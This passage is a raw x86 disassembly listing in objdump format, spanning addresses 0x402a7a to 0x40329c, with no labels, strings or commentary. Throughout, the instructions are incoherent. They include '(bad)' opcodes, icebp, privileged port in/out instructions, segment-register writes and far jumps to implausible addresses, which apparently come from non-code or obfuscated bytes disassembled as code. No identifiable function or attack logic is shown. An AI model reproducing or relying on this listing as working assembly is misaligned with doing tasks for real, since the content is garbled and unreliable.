  402a7a:	xor    eax,0x8af59bad
  402a7f:	mov    cl,0xae
  402a81:	pop    ss
  402a82:	mov    cl,0xad
  402a84:	outs   dx,BYTE PTR ds:[esi]
  402a85:	pushf  
  402a86:	adc    ebx,esp
  402a88:	jp     0x402b01
  402a8a:	mov    ebx,0x782c537b
  402a8f:	cld    
  402a90:	inc    edi
  402a91:	adc    dl,bh
  402a93:	daa    
  402a94:	arpl   WORD PTR [edx+0x4e],sp
  402a97:	xor    ebp,DWORD PTR [edi+0x28f975e9]
  402a9d:	jecxz  0x402abf
  402a9f:	add    DWORD PTR [ecx+ebp*8],0x802c1daa
  402aa6:	dec    edx
  402aa7:	out    dx,eax
  402aa8:	test   al,0xfd
  402aaa:	loopne 0x402a2d
  402aac:	xor    ah,ch
  402aae:	out    dx,eax
  402aaf:	daa    
  402ab0:	ret    
  402ab1:	mov    eax,0xe9660ecb
  402ab6:	imul   esp,ebp,0xffffffe1
  402ab9:	out    0xd3,al
  402abb:	pusha  
  402abc:	jl     0x402acf
  402abe:	push   ebp
  402abf:	adc    edx,esi
  402ac1:	push   es
  402ac2:	push   ebx
  402ac3:	ret    0xf9bf
  402ac6:	and    DWORD PTR [ebx-0x57],ecx
  402ac9:	ret    0x64ed
  402acc:	test   BYTE PTR [edi+0x51],0x5b
  402ad0:	cmc    
  402ad1:	push   0x9a4aafd5
  402ad6:	push   ds
  402ad7:	ret    0x2869
  402ada:	out    0xab,al
  402adc:	stos   BYTE PTR es:[edi],al
  402add:	mov    WORD PTR [eax],gs
  402adf:	jg     0x402a9f
  402ae1:	icebp  
  402ae2:	repnz inc esi
  402ae4:	adc    BYTE PTR [esi+0x1f24515b],dh
  402aea:	cmp    BYTE PTR [edx-0x29af1ba4],dl
  402af0:	pop    ebx
  402af1:	cmc    
  402af2:	mov    ebp,0x6d2eb418
  402af7:	pop    ebx
  402af8:	sub    esi,ebx
  402afa:	icebp  
  402afb:	icebp  
  402afc:	xor    bl,BYTE PTR [edx]
  402afe:	in     al,dx
  402aff:	push   0xde061d74
  402b04:	pop    esp
  402b05:	imul   ebp,DWORD PTR [eax],0x44b1b344
  402b0b:	inc    ebp
  402b0c:	stc    
  402b0d:	mul    BYTE PTR [esi]
  402b0f:	mov    ch,0x99
  402b11:	rcr    DWORD PTR [ebp+0x7f],cl
  402b14:	mov    ebp,0xd3ed1e41
  402b19:	mov    BYTE PTR [ebp+0x21],al
  402b1c:	aam    0xd5
  402b1e:	call   0xec146520
  402b23:	pop    esi
  402b24:	inc    ecx
  402b25:	enter  0x253d,0x73
  402b29:	pop    es
  402b2a:	das    
  402b2b:	adc    al,0x89
  402b2e:	mov    al,0x50
  402b30:	popa   
  402b31:	mov    dh,BYTE PTR [ebp-0x7f]
  402b34:	call   0x70764198
  402b39:	pop    esi
  402b3a:	fmul   DWORD PTR [ebx]
  402b3c:	not    eax
  402b3e:	ss js  0x402b42
  402b41:	sbb    eax,DWORD PTR [ecx+0x79]
  402b44:	call   0x1bbd:0x313db708
  402b4b:	pop    esp
  402b4c:	js     0x402b22
  402b4e:	aad    0xb9
  402b50:	icebp  
  402b51:	pop    es
  402b52:	sub    eax,0xc0d487a2
  402b57:	pop    es
  402b58:	mov    esp,0x2e109b1b
  402b5d:	xor    eax,0xc45a9894
  402b62:	aaa    
  402b63:	mov    cl,BYTE PTR [edi]
  402b65:	out    dx,eax
  402b66:	mov    DWORD PTR [edi],edi
  402b68:	cmp    BYTE PTR [esi+0x7c],ah
  402b6b:	data16 add al,0x11
  402b6e:	ins    DWORD PTR es:[edi],dx
  402b6f:	jbe    0x402b34
  402b71:	inc    eax
  402b72:	ror    cl,0x40
  402b75:	inc    ecx
  402b76:	lahf   
  402b77:	pop    ds
  402b78:	pop    edi
  402b79:	popa   
  402b7a:	icebp  
  402b7b:	or     DWORD PTR [ecx+esi*8-0x42],ecx
  402b7f:	dec    ecx
  402b80:	fnstsw WORD PTR [eax-0x26d6ebb]
  402b86:	ret    0x8b33
  402b89:	xchg   ebp,eax
  402b8a:	retf   0x447f
  402b8d:	sbb    edi,ebx
  402b8f:	or     DWORD PTR [edi],esi
  402b91:	xchg   ecx,eax
  402b92:	add    DWORD PTR [esi-0x8],0x37
  402b96:	dec    esi
  402b97:	adc    ah,ch
  402b99:	mov    esi,0x549dfccb
  402b9e:	sub    esi,ecx
  402ba0:	mov    dh,0x45
  402ba2:	jmp    0x5d28:0xd27b1348
  402ba9:	ins    DWORD PTR es:[edi],dx
  402baa:	mul    BYTE PTR [edi-0x12]
  402bad:	jmp    0xa07c:0x9f138391
  402bb4:	shl    DWORD PTR [esi+0x43bb95ba],1
  402bba:	shl    DWORD PTR [ecx-0x39c8f65d],cl
  402bc0:	add    edi,esi
  402bc2:	jae    0x402b53
  402bc4:	pop    ebp
  402bc5:	pop    ecx
  402bc6:	fiadd  WORD PTR [ebx]
  402bc8:	pcmpgtd mm2,QWORD PTR [ecx]
  402bcb:	inc    edi
  402bcc:	outs   dx,BYTE PTR ds:[esi]
  402bcd:	(bad)  
  402bce:	cmp    bl,BYTE PTR [ebp+0x12ca8ad7]
  402bd4:	adc    ch,BYTE PTR [esi]
  402bd6:	pop    eax
  402bd7:	retf   
  402bd8:	test   eax,0xf8142a28
  402bdd:	add    DWORD PTR [esp+edx*2],0xfb246003
  402be4:	xor    al,0xb0
  402be6:	idiv   ah
  402be8:	push   ecx
  402bea:	push   eax
  402beb:	xchg   esi,eax
  402bec:	mov    ah,0x3c
  402bee:	mov    ebx,0x2e829adb
  402bf3:	xchg   esp,eax
  402bf4:	pop    esi
  402bf5:	push   edi
  402bf6:	mov    al,ds:0x3cd8089b
  402bfb:	lahf   
  402bfc:	push   es
  402bfd:	out    dx,al
  402bfe:	sub    dl,BYTE PTR [esi-0x5448c620]
  402c04:	mov    BYTE PTR [edi],al
  402c06:	je     0x402ba6
  402c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c09:	mov    gs,esi
  402c0b:	dec    ebp
  402c0c:	xchg   BYTE PTR [ebx+0x36],bl
  402c0f:	jno    0x402c5e
  402c11:	adc    BYTE PTR [edx+0x2],cl
  402c14:	push   0x4f
  402c16:	mov    cl,0x4f
  402c18:	mov    eax,0xdcf959bd
  402c1d:	stc    
  402c1e:	cld    
  402c1f:	and    DWORD PTR [edx+eax*1+0x51b08f64],0x65
  402c27:	in     eax,0x5f
  402c29:	ins    DWORD PTR es:[edi],dx
  402c2a:	push   ecx
  402c2b:	fidiv  WORD PTR [ebx+0x4f9e0270]
  402c31:	mov    esp,0x7c1819a4
  402c36:	aad    0xb
  402c38:	mov    ecx,0x72603f2f
  402c3d:	add    esp,DWORD PTR [ecx+0x792483e0]
  402c43:	in     eax,0x89
  402c45:	cld    
  402c46:	mov    edi,eax
  402c48:	push   esi
  402c49:	sbb    eax,0x5fdc4667
  402c4e:	cs in  eax,0xf8
  402c51:	repz mov ds:0xad17a8e9,eax
  402c57:	popf   
  402c58:	mov    edx,0x88cdf8dc
  402c5d:	sbb    ch,BYTE PTR [ecx+ebp*4]
  402c60:	mov    edi,0x7c762fbb
  402c65:	mov    DWORD PTR [eax+0x40],esp
  402c68:	jne    0x402c20
  402c6a:	in     eax,0x36
  402c6c:	test   al,0x80
  402c6e:	(bad)  
  402c6f:	and    ah,bl
  402c71:	ret    0x2ba3
  402c74:	push   0xa74cfca7
  402c79:	push   esp
  402c7a:	add    ah,ch
  402c7c:	in     al,0x64
  402c7e:	icebp  
  402c7f:	inc    edx
  402c80:	pop    es
  402c81:	into   
  402c82:	xchg   edx,eax
  402c83:	lods   eax,DWORD PTR ds:[esi]
  402c84:	test   ch,dl
  402c86:	adc    DWORD PTR fs:[edi+0xa],eax
  402c8a:	clc    
  402c8b:	popa   
  402c8c:	mov    ecx,0x6b199e21
  402c91:	pop    edi
  402c92:	gs pause 
  402c95:	push   0xffffffcd
  402c97:	and    al,dl
  402c99:	adc    BYTE PTR [edi],0x64
  402c9c:	dec    edi
  402c9d:	sub    ecx,DWORD PTR [eax+0x4965e466]
  402ca3:	jne    0x402c94
  402ca5:	mov    ecx,0xa9954135
  402caa:	xlat   BYTE PTR ds:[ebx]
  402cab:	imul   esp,DWORD PTR [edx+0x342fcb98],0x7c
  402cb2:	jge    0x402d07
  402cb4:	inc    ebx
  402cb5:	lds    esi,FWORD PTR [edx+0x46cde648]
  402cbb:	std    
  402cbc:	pop    esi
  402cbd:	jle    0x402d1c
  402cbf:	rcr    BYTE PTR [esi+eiz*8+0x39a157e9],1
  402cc6:	xor    dl,BYTE PTR [edx]
  402cc8:	adc    al,BYTE PTR [edi]
  402cca:	mov    DWORD PTR [ebp-0x75930bbd],edi
  402cd0:	(bad)  
  402cd1:	mov    edx,0x4fb3d489
  402cd6:	add    al,0x54
  402cd8:	sub    ebp,0xfa32a010
  402cde:	clc    
  402cdf:	sub    BYTE PTR [esi+0x47579536],0xb2
  402ce6:	mov    esp,0x9cd7138b
  402ceb:	mov    DWORD PTR [esi+0x7b],edi
  402cee:	out    dx,al
  402cef:	lods   eax,DWORD PTR ds:[esi]
  402cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf1:	icebp  
  402cf2:	xchg   edx,eax
  402cf3:	and    ah,BYTE PTR [ebp-0x68d0af58]
  402cf9:	cli    
  402cfa:	sub    eax,DWORD PTR [ecx+ebx*4-0x7352769a]
  402d01:	fistp  WORD PTR [edi-0x276df0b2]
  402d07:	xor    al,0xd5
  402d09:	mov    ebx,0x5620d6e7
  402d0e:	and    al,0x2b
  402d10:	mov    al,BYTE PTR [eax]
  402d12:	mov    bl,0xa8
  402d14:	jp     0x402d85
  402d16:	mov    WORD PTR [esi-0x1e9cce72],es
  402d1c:	sub    dl,al
  402d1e:	lock bound ebp,QWORD PTR [edi*4-0x11e1849a]
  402d26:	fdivr  QWORD PTR [edi]
  402d28:	mov    DWORD PTR [eax-0x10],edx
  402d2b:	out    0x82,al
  402d2d:	sti    
  402d2e:	mov    edi,0xc8ad9e0e
  402d33:	test   al,0xc8
  402d35:	pop    ss
  402d36:	das    
  402d37:	adc    eax,0x860fd85f
  402d3c:	add    BYTE PTR [edx+eiz*4+0x4f],bh
  402d40:	add    ebx,DWORD PTR ds:0xc80a052a
  402d46:	cmc    
  402d47:	(bad)  
  402d48:	retf   0xbf4f
  402d4b:	mov    dh,0xb7
  402d4d:	dec    ebp
  402d4e:	jmp    0x38682797
  402d53:	scas   al,BYTE PTR es:[edi]
  402d54:	fcmovbe st,st(6)
  402d56:	mov    esp,0x8f9ef6eb
  402d5b:	out    0x50,al
  402d5d:	xor    BYTE PTR [ebx-0x481f4c9e],dl
  402d63:	mov    ch,0x81
  402d65:	xchg   esp,eax
  402d66:	cmp    ah,BYTE PTR [eax+esi*8+0x63]
  402d6a:	mov    al,BYTE PTR [edx+0x28]
  402d6d:	in     eax,0x7d
  402d6f:	push   0xd662793e
  402d74:	test   al,0xdd
  402d76:	in     al,dx
  402d77:	mov    esp,0x51a633cd
  402d7c:	push   0xffffffee
  402d7e:	sahf   
  402d7f:	(bad)  
  402d80:	addr16 jmp 0x402d0f
  402d83:	stos   BYTE PTR es:[edi],al
  402d84:	ret    0xcda8
  402d87:	call   0xfa85c328
  402d8c:	hlt    
  402d8d:	sbb    dh,BYTE PTR [ebx-0xb]
  402d90:	or     eax,0x94879a92
  402d95:	(bad)  
  402d96:	cmp    eax,0xd938c54
  402d9b:	fwait
  402d9c:	jge    0x402dc6
  402d9e:	push   ebp
  402d9f:	sbb    DWORD PTR [esi+0x0],esp
  402da2:	inc    esp
  402da3:	int    0xc8
  402da5:	jp     0x402d3c
  402da7:	and    bh,BYTE PTR [esi-0x41]
  402daa:	add    DWORD PTR [ecx+ecx*1-0x10fd20f7],0xbef9e6b7
  402db5:	cmp    DWORD PTR [edi-0x58e02296],edi
  402dbb:	add    DWORD PTR [ebp+ecx*4+0x31],edx
  402dbf:	xor    al,BYTE PTR [esi+0x5d]
  402dc2:	call   0xa4d5cf03
  402dc7:	std    
  402dc8:	sbb    al,0x56
  402dca:	push   ebp
  402dcb:	jnp    0x402d63
  402dcd:	xchg   ebp,eax
  402dce:	xor    DWORD PTR [edi+eax*2],ecx
  402dd1:	sbb    eax,0xd57d7d57
  402dd6:	inc    ebx
  402dd7:	pop    edx
  402dd8:	mov    eax,0xf903200
  402ddd:	or     BYTE PTR [ecx+0x11],bh
  402de0:	mov    al,0xf0
  402de2:	adc    bh,BYTE PTR [eax-0x62]
  402de5:	mov    eax,ds:0x80fc85a0
  402dea:	std    
  402deb:	sub    DWORD PTR [eax-0x214563e],eax
  402df1:	mov    edi,0xda13810d
  402df6:	test   eax,0x1285c81d
  402dfb:	mov    DWORD PTR [esi-0x6ced0007],esi
  402e01:	sti    
  402e02:	jecxz  0x402dea
  402e04:	jns    0x402e5b
  402e06:	imul   edx,DWORD PTR [ebp-0x57],0x49
  402e0a:	dec    esi
  402e0b:	xor    DWORD PTR [edi+0x45637888],0x27
  402e12:	stos   BYTE PTR es:[edi],al
  402e13:	mov    edi,0xb147a4c4
  402e18:	repnz outs dx,DWORD PTR ds:[esi]
  402e1a:	ins    DWORD PTR es:[edi],dx
  402e1b:	cmp    eax,0xf0d74c3a
  402e20:	call   0xb342:0xeea83bed
  402e27:	jmp    0x4a2c:0xe2bed5e7
  402e2e:	add    dh,ch
  402e30:	sub    al,0x52
  402e32:	fs adc eax,0x321e4979
  402e38:	xchg   DWORD PTR [ecx+ecx*1+0x3d],eax
  402e3c:	or     al,0xc9
  402e3e:	pop    edi
  402e3f:	mov    WORD PTR [esi],gs
  402e41:	mov    edi,0xdd58e36d
  402e46:	shr    BYTE PTR [esi-0x1dbdebe7],cl
  402e4c:	cli    
  402e4d:	mov    dl,0x1e
  402e50:	cmp    BYTE PTR [eax+0x439a52b4],0x84
  402e57:	loop   0x402e23
  402e59:	push   esi
  402e5a:	add    eax,0xe4de0a69
  402e5f:	jp     0x402de2
  402e61:	jp     0x402eba
  402e63:	xor    DWORD PTR [edx-0x27],0x53f64260
  402e6a:	cwde   
  402e6b:	xor    ebx,eax
  402e6d:	stc    
  402e6e:	rcl    DWORD PTR [ebp-0x5fd689b9],0x2c
  402e75:	fcmovbe st,st(0)
  402e77:	xchg   ebp,eax
  402e78:	push   esi
  402e79:	call   0x7184:0x3e62027d
  402e80:	xchg   DWORD PTR [edi],edx
  402e82:	add    eax,0xc2a6e7f1
  402e87:	mov    ebp,0xd537aa76
  402e8c:	jne    0x402e8d
  402e8e:	cmp    ah,BYTE PTR [eax]
  402e90:	push   edi
  402e91:	lods   al,BYTE PTR ds:[esi]
  402e92:	pop    eax
  402e93:	jp     0x402ed8
  402e95:	sbb    DWORD PTR [eax+0x6486162],esp
  402e9b:	je     0x402e61
  402e9d:	or     ebx,ebx
  402e9f:	add    DWORD PTR [esi-0x4e],edi
  402ea2:	retf   
  402ea3:	sbb    eax,0x56c57218
  402ea8:	jge    0x402e67
  402eaa:	leave  
  402eab:	stos   BYTE PTR es:[edi],al
  402eac:	mov    esi,DWORD PTR [edx]
  402eae:	and    al,dh
  402eb0:	inc    ebx
  402eb1:	(bad)
  402eb4:	sub    edi,ecx
  402eb6:	ret    
  402eb7:	jo     0x402ed1
  402eb9:	add    eax,0xb8c79f45
  402ebe:	mov    eax,0x23421806
  402ec3:	mov    eax,ds:0xd85816d6
  402ec8:	mov    edx,0x302332c2
  402ecd:	jbe    0x402ed8
  402ecf:	sub    eax,0xcb40b12b
  402ed4:	add    al,0xd8
  402ed6:	add    ch,ch
  402ed8:	pop    edx
  402ed9:	xchg   esi,eax
  402eda:	xchg   esp,eax
  402edb:	ss in  eax,dx
  402edd:	push   esi
  402ede:	pop    edx
  402edf:	pop    es
  402ee0:	outs   dx,BYTE PTR ds:[esi]
  402ee1:	and    al,0xca
  402ee3:	(bad)  
  402ee4:	lods   eax,DWORD PTR ds:[esi]
  402ee5:	inc    ecx
  402ee6:	push   DWORD PTR [edx]
  402ee8:	mov    BYTE PTR [edx-0x3d043230],cl
  402eee:	mov    ebp,0x15b46965
  402ef3:	add    al,0x72
  402ef5:	outs   dx,DWORD PTR ds:[esi]
  402ef6:	push   0xdbe069db
  402efb:	(bad)
  402eff:	mov    ah,0xa2
  402f01:	sub    ah,ah
  402f03:	add    DWORD PTR [edi-0x4bbf5df0],0x7
  402f0a:	xor    BYTE PTR [edx],dh
  402f0c:	pop    edi
  402f0d:	xor    DWORD PTR [edi-0x50],esp
  402f10:	add    al,0x50
  402f12:	shl    DWORD PTR [edi-0x45628be7],0x82
  402f19:	pop    ecx
  402f1a:	xor    al,0x1f
  402f1c:	in     al,0x24
  402f1e:	pusha  
  402f1f:	arpl   ax,si
  402f21:	mov    esp,0x6cec9b59
  402f26:	adc    BYTE PTR [ebx+0x60a3046],dl
  402f2c:	xor    cl,BYTE PTR [esi]
  402f2e:	pop    ds
  402f2f:	repz jp 0x402f31
  402f32:	inc    ebx
  402f33:	mov    cl,0xdf
  402f35:	popa   
  402f36:	leave  
  402f37:	xchg   esp,eax
  402f38:	std    
  402f39:	jmp    0x402f6c
  402f3b:	outs   dx,BYTE PTR ds:[esi]
  402f3c:	xor    BYTE PTR [ebx+ecx*2-0x6c67957e],dh
  402f43:	(bad)  
  402f44:	cdq    
  402f45:	dec    edi
  402f46:	popf   
  402f47:	in     eax,0x5a
  402f49:	cmc    
  402f4a:	adc    al,BYTE PTR [eax-0x2bdb1fcd]
  402f50:	repz mov cl,0x60
  402f53:	addr16 mov al,0x65
  402f56:	test   al,0x49
  402f58:	popf   
  402f59:	(bad)  
  402f5a:	mov    DWORD PTR ds:0x977ce818,esp
  402f60:	cli    
  402f61:	mov    edx,0x51ba4fa8
  402f66:	push   ebp
  402f67:	add    al,BYTE PTR [eax-0x68]
  402f6a:	and    DWORD PTR [ecx-0x2b],ecx
  402f6d:	xchg   ebx,eax
  402f6e:	mov    ds:0xe34b18b,eax
  402f73:	mov    ebx,0xaac9f40d
  402f78:	dec    edx
  402f79:	mov    ch,0x97
  402f7b:	inc    edx
  402f7c:	mov    ds:0xae693ea3,al
  402f81:	gs jg  0x403002
  402f84:	xor    DWORD PTR [ecx-0x1f],eax
  402f87:	(bad)  
  402f89:	mov    esp,0xeb252337
  402f8e:	retf   0xa71f
  402f91:	adc    edx,DWORD PTR [edi+0x6e]
  402f94:	sbb    al,0xc5
  402f96:	xchg   esi,eax
  402f97:	test   eax,0x463ee2f8
  402f9c:	or     bl,cl
  402f9e:	xchg   ebp,eax
  402f9f:	fbld   TBYTE PTR [ecx]
  402fa1:	and    eax,0xa9032107
  402fa6:	cmp    eax,0x45bc14c2
  402fab:	bnd jnp 0x40302c
  402fae:	imul   ebp,DWORD PTR [edi+edi*2+0x57],0xf58bb2b
  402fb6:	xchg   DWORD PTR [edx],esi
  402fb8:	jo     0x402ff1
  402fba:	(bad)  
  402fbb:	cmp    ebx,DWORD PTR [edi+eax*8+0x11]
  402fbf:	(bad)  
  402fc0:	ja     0x402f87
  402fc2:	icebp  
  402fc3:	jno    0x402f66
  402fc5:	cdq    
  402fc6:	ins    BYTE PTR es:[edi],dx
  402fc7:	xchg   ebx,eax
  402fc8:	pop    es
  402fc9:	inc    ebp
  402fca:	es out dx,eax
  402fcc:	sub    eax,0x6c1d7ead
  402fd1:	cmp    esi,DWORD PTR [edx-0x70]
  402fd4:	clc    
  402fd5:	out    dx,al
  402fd6:	(bad)  
  402fd7:	out    0x8b,eax
  402fd9:	dec    edi
  402fda:	icebp  
  402fdb:	jecxz  0x402f76
  402fdd:	in     al,dx
  402fde:	test   DWORD PTR [ebp-0xb],ebx
  402fe1:	sbb    eax,0xe04f407a
  402fe6:	mov    al,ds:0x1f52d1a
  402feb:	je     0x402fe0
  402fed:	in     eax,dx
  402fee:	inc    ebx
  402fef:	ins    BYTE PTR es:[edi],dx
  402ff0:	push   ds
  402ff1:	and    DWORD PTR [edi+0x4d],ebp
  402ff4:	sbb    ah,BYTE PTR [esi]
  402ff6:	mul    DWORD PTR [esi]
  402ff8:	mov    edx,0xccd100b1
  402ffd:	push   0x8
  402fff:	mov    ss,esi
  403001:	shl    DWORD PTR [ebx+ebx*8],0xf
  403005:	cs repnz addr16 pop eax
  403009:	push   eax
  40300a:	sub    BYTE PTR [ebx],dh
  40300c:	adc    eax,0x5c3b7717
  403011:	cmp    eax,0xc0e3b1c8
  403016:	test   DWORD PTR [ecx],eax
  403018:	aas    
  403019:	mov    ?,WORD PTR [eax-0x50]
  40301c:	jo     0x40308a
  40301e:	test   dh,ch
  403020:	push   ss
  403021:	mov    bl,0x47
  403023:	dec    esi
  403024:	and    al,0xdb
  403026:	arpl   WORD PTR [esp+ebx*8+0x65],bp
  40302a:	xchg   DWORD PTR [ecx-0xded8f9f],edx
  403030:	je     0x403014
  403032:	imul   edx,DWORD PTR [eax+0x71],0xffffffe1
  403036:	xchg   DWORD PTR [edx+esi*1-0x57],esp
  40303a:	jne    0x85149bec
  403040:	lods   eax,DWORD PTR ds:[esi]
  403041:	aas    
  403042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403043:	jae    0x40305e
  403045:	push   ecx
  403046:	or     al,0x96
  403048:	push   es
  403049:	or     eax,0x686381d8
  40304e:	sub    al,0x37
  403050:	ret    
  403051:	xchg   DWORD PTR [ebx-0x65],esi
  403054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403055:	test   edx,esi
  403057:	inc    BYTE PTR [edx+eiz*8]
  40305a:	das    
  40305b:	lds    esp,FWORD PTR [esi+0x41]
  40305e:	mul    DWORD PTR [eax-0x76]
  403061:	into   
  403062:	shr    DWORD PTR [eax],cl
  403064:	mov    ds:0xf25bb57a,eax
  403069:	xor    bh,bh
  40306b:	adc    cl,al
  40306d:	xor    DWORD PTR [ebx-0x4b72f552],esi
  403073:	xor    DWORD PTR [ebx+esi*1-0x3566214a],ecx
  40307a:	mov    eax,ds:0x8216a6d5
  40307f:	aad    0x2e
  403081:	aad    0xe7
  403083:	aaa    
  403084:	pushf  
  403085:	in     al,0xc1
  403087:	leave  
  403088:	sub    BYTE PTR [edx],dl
  40308a:	or     al,0x1
  40308c:	add    bh,ah
  40308e:	cwde   
  40308f:	icebp  
  403090:	pop    eax
  403091:	pop    ecx
  403092:	int    0xbc
  403094:	sbb    eax,0x6eb2124d
  403099:	or     dh,BYTE PTR [edx]
  40309b:	inc    edx
  40309c:	cmc    
  40309d:	in     al,dx
  40309e:	mov    al,0x9
  4030a0:	fneni(8087 only) 
  4030a2:	xor    BYTE PTR cs:[edx+0x3ac9bf56],al
  4030a9:	pop    es
  4030aa:	push   ecx
  4030ab:	mov    WORD PTR [esi-0x652dd0bf],ds
  4030b1:	repz mov ss,esi
  4030b4:	out    0x59,al
  4030b6:	add    al,0x6e
  4030b8:	xor    ah,al
  4030ba:	test   al,0x11
  4030bc:	dec    ecx
  4030bd:	xlat   BYTE PTR ds:[ebx]
  4030be:	outs   dx,BYTE PTR ds:[esi]
  4030bf:	sbb    edx,DWORD PTR [esi+ecx*4-0x68858a3d]
  4030c6:	daa    
  4030c7:	mov    esp,0xfee7f276
  4030cc:	cld    
  4030cd:	cmp    eax,0x7876532c
  4030d2:	aas    
  4030d3:	pushf  
  4030d4:	lods   al,BYTE PTR ds:[esi]
  4030d5:	xchg   DWORD PTR [edi+edx*8-0x5df4c6bf],esi
  4030dc:	hlt    
  4030dd:	or     eax,0x38a99bbd
  4030e2:	dec    esi
  4030e3:	clc    
  4030e4:	adc    al,0xac
  4030e6:	inc    edi
  4030e7:	jmp    0x3be9c56c
  4030ec:	mov    DWORD PTR [esi],eax
  4030ee:	mov    WORD PTR [ebx],ss
  4030f0:	lea    eax,[di+0x12]
  4030f4:	mov    bh,0xdc
  4030f6:	push   edi
  4030f7:	mov    ch,0x5f
  4030f9:	mov    ch,BYTE PTR [eax-0x6faf00e2]
  4030ff:	dec    edx
  403100:	ins    BYTE PTR es:[edi],dx
  403101:	and    eax,0xa63ae1af
  403106:	sti    
  403107:	int3   
  403108:	push   0x2
  40310a:	fld    TBYTE PTR [ebp-0x3]
  40310d:	mov    al,0x16
  40310f:	outs   dx,DWORD PTR ds:[esi]
  403110:	mov    eax,DWORD PTR [edi-0x1512f219]
  403116:	into   
  403117:	in     eax,0x3f
  403119:	push   cs
  40311a:	cli    
  40311b:	popf   
  40311c:	dec    ebp
  40311d:	je     0x403132
  40311f:	xor    BYTE PTR [ebx-0x5dfa48a9],ah
  403125:	data16 jp 0x403121
  403128:	shl    BYTE PTR [ebx+0x5b041b48],0x68
  40312f:	inc    esi
  403130:	test   al,0x91
  403132:	mov    ecx,0x8d938bea
  403137:	imul   dx,WORD PTR ds:0x57367289,0xa7d4
  403140:	ror    BYTE PTR [edi+0x1a6a51c9],cl
  403146:	leave  
  403147:	jle    0x4030e5
  403149:	loop   0x4031b8
  40314b:	btr    DWORD PTR [ecx],0xc0
  40314f:	sub    eax,0xbd7e4f6
  403154:	lock xchg DWORD PTR [edi+0x38],ebx
  403158:	mov    edi,0x9d699ce3
  40315d:	push   ecx
  40315e:	fstp   TBYTE PTR [esi+0x269ce919]
  403164:	stc    
  403165:	and    BYTE PTR gs:[ebp+0x7206f3bd],dl
  40316c:	ret    
  40316d:	and    dl,BYTE PTR [ebx]
  40316f:	popf   
  403170:	add    eax,0x698ff963
  403175:	jp     0x403199
  403177:	jecxz  0x4031a9
  403179:	lods   eax,DWORD PTR ds:[esi]
  40317a:	and    eax,0x41a539fd
  40317f:	adc    ecx,DWORD PTR [ebp+0x1c]
  403182:	je     0x403160
  403184:	test   bl,dl
  403186:	inc    ebp
  403187:	push   ss
  403188:	loope  0x4031ee
  40318a:	or     dh,BYTE PTR [edx-0x740935cc]
  403190:	xor    DWORD PTR gs:[ebx],ebx
  403193:	ret    0x1d0b
  403196:	pop    ds
  403197:	repz test DWORD PTR [eax+edi*4],esi
  40319b:	inc    edx
  40319c:	xlat   BYTE PTR ds:[ebx]
  40319d:	xchg   edi,eax
  40319e:	push   ebx
  40319f:	sub    cl,cl
  4031a1:	sti    
  4031a2:	out    0x75,eax
  4031a4:	mov    bl,ah
  4031a6:	lock jecxz 0x403168
  4031a9:	push   edi
  4031aa:	push   eax
  4031ab:	(bad)
  4031b1:	es dec edi
  4031b3:	dec    esi
  4031b4:	(bad)  
  4031b5:	push   edi
  4031b6:	or     eax,0x98b574dd
  4031bb:	(bad)  
  4031bc:	mov    eax,ds:0x1233922c
  4031c1:	adc    bl,0x1d
  4031c4:	jecxz  0x4031af
  4031c6:	mov    cl,0x18
  4031c8:	iret   
  4031c9:	inc    eax
  4031ca:	ret    0x1a6c
  4031cd:	addr16 jge 0x4031e2
  4031d0:	add    BYTE PTR [ebx+0x55988bf6],bl
  4031d6:	xchg   edx,eax
  4031d7:	push   edx
  4031d8:	inc    eax
  4031d9:	lods   al,BYTE PTR ds:[esi]
  4031da:	mov    BYTE PTR [ebx],0x63
  4031dd:	and    BYTE PTR [ebp+0x22e702c],cl
  4031e3:	je     0x4031be
  4031e5:	mov    ebp,0xa4816ff2
  4031ea:	sbb    DWORD PTR [ecx+edi*2],0xaf2e99d6
  4031f1:	jns    0x403216
  4031f3:	stos   DWORD PTR es:[edi],eax
  4031f4:	stos   DWORD PTR es:[edi],eax
  4031f5:	add    edx,DWORD PTR ds:0x9a254f18
  4031fb:	lock push 0xb7977834
  403201:	test   eax,0x2de9a7e6
  403206:	stos   BYTE PTR es:[edi],al
  403207:	scas   al,BYTE PTR es:[edi]
  403208:	or     esi,esi
  40320a:	sbb    ecx,ebx
  40320c:	sub    BYTE PTR [edi],bl
  40320e:	popa   
  40320f:	sti    
  403210:	inc    esi
  403211:	or     BYTE PTR [ebx-0x61c6a670],bl
  403217:	inc    edx
  403218:	daa    
  403219:	jmp    0x4031c9
  40321b:	jae    0x403290
  40321d:	cs and al,0x82
  403220:	xchg   edi,eax
  403221:	bound  ebp,QWORD PTR [esp+esi*8+0x482ad857]
  403228:	bound  ebx,QWORD PTR es:[edx+0x6431b5e4]
  40322f:	mov    esi,0xd1fcdeb2
  403234:	sub    edi,DWORD PTR [eax-0x22]
  403237:	stc    
  403238:	in     eax,0x6c
  40323a:	adc    DWORD PTR [ebx],0xffffffbe
  40323d:	and    eax,0x6da51ae0
  403242:	push   0xffffffda
  403244:	repnz loopne 0x4031d0
  403247:	sar    DWORD PTR [edi+0x1d3bc98c],cl
  40324d:	out    0xa6,al
  40324f:	xchg   edx,eax
  403250:	xor    eax,0xd072176b
  403255:	adc    eax,0x1f447407
  40325a:	(bad)  
  40325c:	sub    eax,0x83fa5261
  403261:	cmp    ebx,ebp
  403263:	adc    ah,BYTE PTR [esi]
  403265:	jmp    0xe83e2e8e
  40326a:	mov    al,0xbb
  40326c:	mov    cs,edi
  40326e:	or     ecx,DWORD PTR [eax]
  403270:	loop   0x403296
  403272:	icebp  
  403273:	ret    0x6e67
  403276:	stos   BYTE PTR es:[edi],al
  403277:	mov    WORD PTR [edi-0x2d],ss
  40327a:	cmp    DWORD PTR [ebx+ebx*4+0xe],ecx
  40327e:	scas   al,BYTE PTR es:[edi]
  40327f:	dec    edx
  403280:	adc    edx,DWORD PTR ds:0x2b585111
  403286:	bound  ecx,QWORD PTR [edx]
  403288:	outs   dx,BYTE PTR ds:[esi]
  403289:	jle    0x4032ee
  40328b:	(bad)  
  40328c:	idiv   ch
  40328e:	jl     0x4032d3
  403290:	pop    ds
  403291:	xchg   edx,eax
  403292:	fld    DWORD PTR [eax]
  403294:	sub    al,0xfa
  403296:	inc    ebx
  403297:	in     al,dx
  403298:	(bad)  
  403299:	jp     0x403257
  40329b:	xchg   ebp,eax
  40329c:	mov    edx,0x2d84dc78
